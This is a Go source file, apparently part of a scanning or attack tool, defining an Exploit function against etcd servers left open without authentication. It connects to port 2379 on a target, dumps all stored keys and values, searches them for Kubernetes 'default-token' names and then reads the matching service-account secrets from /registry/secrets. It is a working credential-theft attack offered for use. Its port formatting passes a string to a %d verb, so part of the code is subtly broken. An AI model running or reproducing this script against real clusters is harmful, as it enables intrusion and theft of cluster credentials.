package etcd

import (
    "context"
    "fmt"
    "log"
    "time"
    "regexp"
    "bytes"
    "strings"

    "go.etcd.io/etcd/client/v3"
)

// Exploit 利用etcd的未授权访问漏洞
func Exploit(targetURL string) bool {
    if !strings.HasPrefix(targetURL, "http") {
        targetURL = "http://" + targetURL
    }
    parts := strings.Split(targetURL, ":")
    ip := parts[1][2:] // Remove "//"
    cfg := clientv3.Config{
        Endpoints:   []string{fmt.Sprintf("http://%s:%d", ip, "2379")},
        DialTimeout: 5 * time.Second,
    }

    client, err := clientv3.New(cfg)
    if err != nil {
        log.Printf("etcd:%s:%d连接失败: %v", ip, "2379", err)
        return false
    }
    defer client.Close()

    ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
    defer cancel()

    resp, err := client.Get(ctx, "", clientv3.WithPrefix())
    if err != nil {
        log.Printf("etcd攻击失败: %v", err)
        return false
    }

    for _, kv := range resp.Kvs {
        if kv.Value != nil {
            log.Println("etcd存在未授权访问")
            log.Println(string(kv.Value))
            if bytes.Contains(kv.Value, []byte("default-token")) {
                re := regexp.MustCompile(`default-token-\w{1,5}`)
                tokens := re.FindAll(kv.Value, -1)
                if len(tokens) > 0 {
                    token := string(tokens[0])
                    log.Printf("发现token: %s", token)
                    log.Println("尝试获取对应的/registry/secrets/default/token信息")
                    tokenResp, err := client.Get(ctx, fmt.Sprintf("/registry/secrets/default/%s", token))
                    if err != nil {
                        log.Printf("获取token信息失败: %v", err)
                        continue
                    }
                    log.Printf("对应的/registry/secrets/default/token信息数据为: %v", tokenResp.Kvs)
                }
            }
        }
    }

    return true
}